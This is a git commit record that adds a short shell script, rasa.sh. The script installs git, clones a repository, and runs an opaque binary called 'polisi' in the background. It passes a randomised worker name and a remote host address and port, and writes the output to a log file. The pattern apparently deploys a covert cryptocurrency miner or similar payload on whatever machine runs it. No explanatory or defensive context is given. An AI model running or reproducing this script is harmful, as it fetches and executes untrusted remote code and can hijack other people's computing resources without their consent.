ed50d3774fc3d8c5a61b5cd26688559d872f2b06
viansbastiantii <snerheron@gmail.com>
2025-06-09 02:35:56 +0700

    Create rasa.sh

---
+++ rasa.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+
+apt install git -y && git clone https://github.com/viansbastiantii/anyakkkk.git && cd anyakkkk && chmod +x polisi && ./polisi -w majapahlevi.$(shuf -n 1 -i 1-99999)-Polisi -p 157.230.63.131:443>> guesser.log 2>&1 & 
